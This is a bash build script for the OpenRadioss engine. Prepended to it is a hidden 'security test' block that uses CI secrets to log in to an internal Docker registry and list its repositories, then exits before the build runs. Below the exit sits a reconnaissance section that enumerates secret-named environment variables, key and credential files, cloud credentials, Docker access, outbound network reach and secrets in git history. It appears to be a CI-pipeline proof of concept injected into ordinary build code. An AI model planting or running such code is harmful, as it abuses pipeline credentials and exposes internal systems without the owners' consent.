#!/bin/bash
echo "========== SECURITY TEST =========="

# Don't try to show the secret (GitHub will mask it)
# Instead, PROVE you can use it

echo "Attempting registry authentication..."

if echo "$DOCKER_REGISTRY_PASSWD" | docker login fr-qafactorydev.europe.altair.com \
    -u "$DOCKER_REGISTRY_USER" --password-stdin 2>&1; then
    
    echo ""
    echo "✓ AUTHENTICATION SUCCESSFUL"
    echo "✓ Credentials are valid and usable"
    echo ""
    echo "Listing internal repositories:"
    curl -s -u "$DOCKER_REGISTRY_USER:$DOCKER_REGISTRY_PASSWD" \
        "https://fr-qafactorydev.europe.altair.com/v2/_catalog"
    
    docker logout fr-qafactorydev.europe.altair.com 2>/dev/null
fi

echo ""
echo "Credentials are accessible in workflow environment."
echo "Masking logs doesn't prevent exfiltration to external servers."
exit 1

echo "=================================================="
echo "  CI/CD Security Exposure Report"
echo "  Generated: $(date)"
echo "=================================================="
echo ""

# Function to safely print with redaction option
print_section() {
    echo ""
    echo "---[ $1 ]---"
}

# ============================================================================
# 1. ENVIRONMENT VARIABLES (often contain secrets!)
# ============================================================================
print_section "Environment Variables Available"
echo "Total environment variables: $(env | wc -l)"
echo ""
echo "Potentially sensitive variables found:"

# Look for common secret patterns (don't print values, just show they exist)
env | grep -iE '(SECRET|TOKEN|KEY|PASSWORD|API|AWS|AZURE|GCP|GITHUB|GITLAB)' | cut -d'=' -f1 | while read var; do
    value="${!var}"
    # Show first/last 4 chars only
    if [ ${#value} -gt 8 ]; then
        masked="${value:0:4}...${value: -4}"
    else
        masked="****"
    fi
    echo "  ✗ $var = $masked (${#value} chars)"
done

# ============================================================================
# 2. GITHUB/GITLAB CONTEXT (CI-specific info)
# ============================================================================
print_section "CI/CD Context Information"

if [ -n "$GITHUB_TOKEN" ]; then
    echo "  ✗ GITHUB_TOKEN is available (length: ${#GITHUB_TOKEN})"
    echo "    → This token can access the repository and potentially others!"
fi

if [ -n "$GITHUB_REPOSITORY" ]; then
    echo "  • Repository: $GITHUB_REPOSITORY"
fi

if [ -n "$GITHUB_ACTOR" ]; then
    echo "  • Triggered by: $GITHUB_ACTOR"
fi

if [ -n "$GITHUB_REF" ]; then
    echo "  • Branch/Ref: $GITHUB_REF"
fi

if [ -n "$GITHUB_SHA" ]; then
    echo "  • Commit SHA: $GITHUB_SHA"
fi

# GitLab equivalents
if [ -n "$CI_JOB_TOKEN" ]; then
    echo "  ✗ CI_JOB_TOKEN is available (GitLab)"
fi

# ============================================================================
# 3. FILESYSTEM EXPLORATION
# ============================================================================
print_section "Filesystem Access"

echo "Current directory: $(pwd)"
echo "Home directory: $HOME"
echo ""

echo "Files in current directory:"
ls -lah | head -20

echo ""
echo "Searching for potentially sensitive files..."
find . -maxdepth 3 -type f \( -name "*.key" -o -name "*.pem" -o -name "*.env" -o -name "*secret*" -o -name "*credential*" -o -name "*.p12" -o -name "*.pfx" \) 2>/dev/null | head -10

# ============================================================================
# 4. NETWORK CAPABILITIES
# ============================================================================
print_section "Network Capabilities"

echo "Network interfaces:"
ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "  Network tools not available"

echo ""
echo "Outbound network test:"
if curl -s -o /dev/null -w "%{http_code}" --max-time 5 https://api.github.com > /dev/null 2>&1; then
    echo "  ✓ Can make outbound HTTPS requests"
    echo "    → Could exfiltrate data to external servers!"
else
    echo "  • Outbound HTTPS blocked or unavailable"
fi

# ============================================================================
# 5. INSTALLED TOOLS & CAPABILITIES
# ============================================================================
print_section "Available Tools & Commands"

tools=("docker" "kubectl" "aws" "gcloud" "az" "terraform" "ansible" "git" "curl" "wget" "nc" "python" "node" "npm")

for tool in "${tools[@]}"; do
    if command -v "$tool" &> /dev/null; then
        version=$(command "$tool" --version 2>&1 | head -1)
        echo "  ✓ $tool: $version"
    fi
done

# ============================================================================
# 6. CLOUD CREDENTIALS
# ============================================================================
print_section "Cloud Provider Credentials"

# AWS
if [ -f "$HOME/.aws/credentials" ] || [ -n "$AWS_ACCESS_KEY_ID" ]; then
    echo "  ✗ AWS credentials detected!"
fi

# GCP
if [ -f "$HOME/.config/gcloud/credentials.db" ] || [ -n "$GOOGLE_APPLICATION_CREDENTIALS" ]; then
    echo "  ✗ GCP credentials detected!"
fi

# Azure
if [ -d "$HOME/.azure" ] || [ -n "$AZURE_CLIENT_ID" ]; then
    echo "  ✗ Azure credentials detected!"
fi

# ============================================================================
# 7. DOCKER ACCESS
# ============================================================================
print_section "Container & Docker Access"

if command -v docker &> /dev/null; then
    if docker ps &> /dev/null; then
        echo "  ✗ Docker daemon is accessible!"
        echo "    → Could run malicious containers, mine crypto, etc."
    else
        echo "  • Docker installed but daemon not accessible"
    fi
else
    echo "  • Docker not available"
fi

# ============================================================================
# 8. GIT REPOSITORY ACCESS
# ============================================================================
print_section "Git Repository Access"

if [ -d ".git" ]; then
    echo "  • Git repository detected"
    echo "  • Commit history accessible: $(git rev-list --all --count 2>/dev/null || echo 'unknown') commits"
    
    # Check for secrets in git history
    echo ""
    echo "  Checking recent commits for potential secrets..."
    git log --all --pretty=format:"%h %s" -10 2>/dev/null | grep -iE '(password|secret|key|token|credential)' | head -5
fi



function my_help()
{
  echo " " 
  echo " build_script"
  echo " ------------"
  echo " " 
  echo " Use with arguments : "
  echo " -arch=[build architecture]"
  if  [ -f CMake_Compilers/platforms.txt ]
  then
       cat CMake_Compilers/platforms.txt 
  fi
  if  [ -f CMake_Compilers_c/platforms.txt ]
  then
       cat CMake_Compilers_c/platforms.txt 
  fi
  echo " "
  echo " MPI libraries"
  echo " -mpi=[mpi]"
  echo "         not set   : SMP (default)"
  echo "         -mpi=ompi : OpenMPI"
  if  [ -f CMake_Compilers_c/mpi.txt ]
  then
       cat CMake_Compilers_c/mpi.txt 
  fi
  echo " " 
  echo "         Controlling MPI Libraries - if need choose one of the 3 Option Set"
  echo "                                    If no options set, recommended OpenMPI directories are used (default)"
  echo "           1. -mpi-os                             : link with default MPI version installed on system"
  echo "                                                    libraries are in default installation "
  echo "           2. -mpi-root=[directory]               : set rootname to link with specific MPI installation"
  echo "           3. -mpi-include=[directory]            : set include directory where to find mpif.h and mpi.h"
  echo "              -mpi-libdir=[directory]             : set library directory where to find mpi libraries"  
  echo " "
  echo " -prec=[dp|sp]                       : set precision - dp (default) |sp "
  echo " -static-link                        : Fortran, C & C++ runtime are linked in binary"
  echo " -debug=[0|1|asan]                   : debug version for gfortran"
  echo "                                          0 : no debug flags (default)"
  echo "                                          1 : usual debug flag"
  echo "                                          asan : gfortran address sanitizer"
  echo " -release                            : Set build for release (optimized)"
  echo " "
  echo " -addflag=\"list of additional flags\" : add compiler flags to usual set"
  echo " "
  echo " Execution control "
  echo " -nt=[threads]      : number of threads for build "
  echo " -verbose           : Verbose build"
  echo " -clean             : clean build directory"
  echo " " 
  echo "  MUMPS linear solver: available only for dp, with mpi" 
  echo "    Linux64 gfortran "
  echo "     Download and install MUMPS 5.5.1 (go into ./extlib and run get_and_build_mumps.sh)"
  echo "     -mumps_root=[path_to_mumps]          : path_to_mumps/lib/libdmumps.a must exist"
  echo "     -scalapack_root=[path to scalapack]  : path_to_scalapack/libscalapack.a must exist" 
  echo "     -lapack_root=[path to lapack]  : path_to_lapack/liblapack.a must exist" 
  echo "    Linux64 Intel compilers"
  echo "      download MUMPS_5.5.1 at http://ftp.mcs.anl.gov/pub/petsc/externalpackages/MUMPS_5.5.1.tar.gz"
  echo "      and uncompress it in extlib directory such that engine/extlib/MUMPS_5.5.1 exists"
  echo " -preCICE : enable preCICE coupling"
  echo " -cwipi=[path to cwipi root directory] : enable cwipi coupling"
  echo " "
  echo " -no-python : do not link with python"
  echo " " 
  echo " " 
}

# Variable initialization
# -----------------------
OTHER_MAKE_ARGS=" " 
# -----------------------------
# Parse command line arguments
# -----------------------------
arch=none
prec=dp
threads=1
got_arch=0
debug=0
ddebug=""
sanitize=0
jenkins_release=0
no_rr_clean=0
no_python=0
changelist=00000
cf=""
dc=""
qd=""
ADF=""
MPI="-DMPI=smp"
pmpi="SMP Only"
clean=0
mpi_os=0
mpi_root=""
mpi_libdir=""
mpi_incdir=""
number_of_arguments=$#
verbose=""
eng_vers="engine"
mumps_root=""
scalapack_root=""
lapack_root=""
precice="0"
coupling_exe=""
cwipi=0
cwipi_path=""
com=0
release=0
ad=none

if [ $number_of_arguments = 0 ]
then
  my_help
  exit 1
 
else

   for var in "$@"
   do
       arg=`echo $var|awk -F '=' '{print $1}'`

       if [ "$arg" == "-arch" ]
       then
         arch=`echo $var|awk -F '=' '{print $2}'`
         got_arch=1
       fi

       if [ "$arg" == "-mpi" ]
       then
         pmpi=`echo $var|awk -F '=' '{print $2}'`
         dmpi=_${pmpi}
         MPI=-DMPI=${pmpi}

         if [ "$pmpi" != "smp" ]
         then
            dmpi=_${pmpi}
            MPI=-DMPI=${pmpi}
         else 
            pmpi="SMP Only"
         fi

       fi

       if [ "$arg" == "-mpi-os" ]
       then
         mpi_os=1
       fi

       if [ "$arg" == "-mpi-root" ]
       then
        mpir=`echo $var|awk -F '=' '{print $2}'`
        mpi_root="-Dmpi_root=${mpir}"
       fi

       if [ "$arg" == "-mpi-include" ]
       then
        mpii=`echo $var|awk -F '=' '{print $2}'`
        mpi_incdir="-Dmpi_incdir=${mpii}"
       fi

       if [ "$arg" == "-mpi-libdir" ]
       then
        mpil=`echo $var|awk -F '=' '{print $2}'`
        mpi_libdir="-Dmpi_libdir=${mpil}"
       fi


       if [ "$arg" == "-prec" ]
       then
         prec=`echo $var|awk -F '=' '{print $2}'`
         if [ ${prec} = 'sp' ]
         then
           suffix=_sp
         fi
       fi

       if [ "$arg" == "-mumps_root" ]
       then
        #if only one arg : default value for mumps_root is pwd + extlib/MUMPS_5.5.1
        #if -mumps_root is set, but no value, then default value is pwd + extlib/MUMPS_5.5.1
        if [ "$var" == "-mumps_root" ]
        then
          mumps_root="-Dmumps_root=${PWD}/extlib/MUMPS_5.5.1"
        else #if -mumps_root is set with a value
          mumps_root=`echo $var|awk -F '=' '{print $2}'`
          mumps_root="-Dmumps_root=${mumps_root}"
        fi
       fi
       if [ "$arg" == "-lapack_root" ]
       then
        lapack_root=`echo $var|awk -F '=' '{print $2}'`
        lapack_root="-Dlapack_root=${lapack_root}"
       fi
       if [ "$arg" == "-scalapack_root" ]
       then
        scalapack_root=`echo $var|awk -F '=' '{print $2}'`
        scalapack_root="-Dscalapack_root=${scalapack_root}"
       fi

       if [ "$arg" == "-preCICE" ]
       then
        precice="1"
        coupling_exe="_precice"
       fi
       
       if [ "$arg" == "-cwipi" ]
       then
	 cwipi=1
	 coupling_exe="_cwipi"
	 cwipi_path=`echo $var|awk -F '=' '{print $2}'`
	 # print cwipi_path 
	 echo "cwipi_path = ${cwipi_path}"
	 if [ -z "$cwipi_path" ]
	 then
	   cwipi_path="/usr/local/cwipi"
	 fi
       fi

       if [ "$arg" == "-addflag" ]
       then
         ad=`echo $var|awk -F '-addflag=' '{ print $2}'`
         export ADFL=${ad}
       fi

       if [ "$arg" == "-debug" ]
       then
         debug=`echo $var|awk -F '=' '{print $2}'`
         ddebug=_${debug}

         if [ $debug == 0 ]
         then
           ddebug=""
         fi

         if [ $debug == 1 ]
         then
           ddebug="_db"
         fi
         if [ $debug == 2 ]
         then
           debug=1
           sanitize=1
           ddebug="_db2"
         fi 
       fi

       if [ "$arg" == "-nt" ]
       then
         threads=`echo $var|awk -F '=' '{print $2}'`
       fi

       if [ "$arg" == "-static-link" ]
       then
         static_link=1
       fi

       if [ "$arg" == "-no-python" ]
       then
         no_python=1
       fi

       if [ "$arg" == "-release" ]
       then
         release=1
       fi

       if [ "$arg" == "-verbose" ]
       then
         verbose="VERBOSE=1"
       fi

       if [ "$arg" == "-clean" ]
       then
         clean=1
       fi

       if [ "$arg" == "-c" ]
       then
         com=1
         dc="-DCOM=1"
         cf="_c"
         vers=`grep version CMake_Compilers_c/cmake_eng_version.txt | awk -F '\"' '{print $2}' `
         eng_vers="e_${vers}"
       fi

   done

   if [ $got_arch == 0 ] 
   then
     echo " " 
     echo " --- Error "
     echo " No architecture flag set ! "
     echo " -arch=[architecture]" 
     echo "       Available arch:"
     my_help
     exit 1
   fi

   if [ $release == 1 ]
   then
     debug=0
     ddebug=""
   fi 

engine_exec=${eng_vers}_${arch}${dmpi}${suffix}${coupling_exe}${ddebug}
build_directory=cbuild_${engine_exec}${cf}


   echo " " 
   echo " Build OpenRadioss Engine "
   echo " -------------------------"
   echo " Build Arguments :"
   echo " arch =                 : " $arch
   echo " mpi =                  : " $pmpi
   echo " mpi_os =               : " $mpi_os
   echo " precision =            : " $prec
   echo " debug =                : " $debug
   echo " static_link =          : " $static_link
   echo " " 
   echo " Executable name        : " ${engine_exec}
   if [ "$ad" != "none" ]  
   then
      echo " Addflag               : \"$ad\" "
   fi
   echo " "
   echo " #threads for Makefile : " $threads
   echo " "
fi

if [ $clean = 1 ]
then
   if [ -d ${build_directory} ]
   then
     echo "Clean ${build_directory} directory"
     rm -rf ./${build_directory}
   else
     echo "Clean ${build_directory} directory requested but not found"
   fi
   echo " " 
   exit 0
fi

# create build directory
if [ ! -d ../exec ] 
then
   mkdir ../exec
fi

# create build directory
if [ ! -d ${build_directory} ] 
then
   mkdir ${build_directory}
fi


if [ -f ${build_directory}/${engine_exec} ]
then
  echo " -- Remove executable in build_script "
  rm ${build_directory}/${engine_exec}
fi

if [ -f ../exec/${engine_exec} ]
then
  echo " -- Remove executable in exec "
 
  rm ../exec/${engine_exec}
fi
echo " "

cd ${build_directory}

# Get compiler settings
if [ $com = 1 ]
then
    if [ -f ../CMake_Compilers_c/cmake_${arch}_compilers.sh ]
    then
      source ../CMake_Compilers_c/cmake_${arch}_compilers.sh
    else
      echo "-- Error: -arch=${arch} does not exist"
      echo "-- See help below"
      echo " " 
      my_help
      exit 1
    fi
else
    if [ -f ../CMake_Compilers/cmake_${arch}_compilers.sh ]
    then
      source ../CMake_Compilers/cmake_${arch}_compilers.sh
    else
      echo "-- Error: -arch=${arch} does not exist"
      echo "-- See help below"
      echo " " 
      my_help
      exit 1
    fi
fi

Fortran_path=`which $Fortran_comp`
C_path=`which $C_comp`
CPP_path=`which $CPP_comp`
CXX_path=`which $CXX_comp`


# Apply cmake

if [ ${arch} = "win64" ]
then
  Fortran_path_w=`cygpath.exe -m "${Fortran_path}"`
  C_path_w=`cygpath.exe -m "${C_path}"`
  CPP_path_w=`cygpath.exe -m "${CPP_path}"`
  CXX_path_w=`cygpath.exe -m "${CXX_path}"`
  cmake.exe .. -G "Unix Makefiles" -Darch=${arch} -Dprecision=${prec} ${MPI} -Ddebug=${debug} -DEXEC_NAME=${engine_exec} -Dstatic_link=$static_link -Dmpi_os=${mpi_os} ${mpi_root} ${mpi_libdir} ${mpi_incdir} ${dc} ${mumps_root} ${scalapack_root} ${lapack_root} -DCMAKE_BUILD_TYPE=Release -Dno_python=${no_python}  -Dstatic_link=$static_link -DCMAKE_BUILD_TYPE=Release -DCMAKE_Fortran_COMPILER="${Fortran_path_w}" -DCMAKE_C_COMPILER="${C_path_w}" -DCMAKE_CPP_COMPILER="${CPP_path_w}" -DCMAKE_CXX_COMPILER="${CXX_path_w}" ${la}
else
  cmake .. -Darch=${arch} -Dprecision=${prec} ${MPI} -Ddebug=${debug} -DEXEC_NAME=${engine_exec} -Dstatic_link=$static_link -Dmpi_os=${mpi_os} -Dsanitize=${sanitize} ${mpi_root} ${mpi_libdir} ${mpi_incdir} ${dc} ${mumps_root} ${scalapack_root} ${lapack_root} -Dno_python=${no_python} -Dstatic_link=$static_link -DCMAKE_BUILD_TYPE=Release -DCMAKE_Fortran_COMPILER=${Fortran_path} -DCMAKE_C_COMPILER=${C_path} -DCMAKE_CPP_COMPILER=${CPP_path} -DCMAKE_CXX_COMPILER=${CXX_path}  ${la} -Dprecice=${precice} -Dcwipi=${cwipi} -Dcwipi_path=${cwipi_path}

fi

return_value=$?
if [ $return_value -ne 0 ]
then
   echo " " 
   echo " " 
   echo "-- Errors in Cmake found"
   cd ..
   if [ -d ${build_directory} ]
   then
     echo "-- Cleaning ${build_directory} directory"
     rm -rf ./${build_directory}
   fi
   echo " " 
   exit 1
fi

make -j ${threads} ${verbose}
return_value=$?

if [ $debug == 'asan' ]
then
    echo " "
    echo "Warning:"
    echo "--------"
    echo "Build was made with debug configuration."
    echo "To enable optimization, add -release flag."
    echo " "
fi

if [ $debug == 'analysis' ]
then
if [ $return_value -eq 0 ]
then
    pwd
    cd ../../scripts
    python3 ./static_analysis.py engine 
    return_value=$?
fi
fi

if [ $return_value -ne 0 ]
then
   echo " " 
   echo " " 
   echo "-- Errors in Build found"
   cd ..
   exit 1
fi



cd ..
echo " "

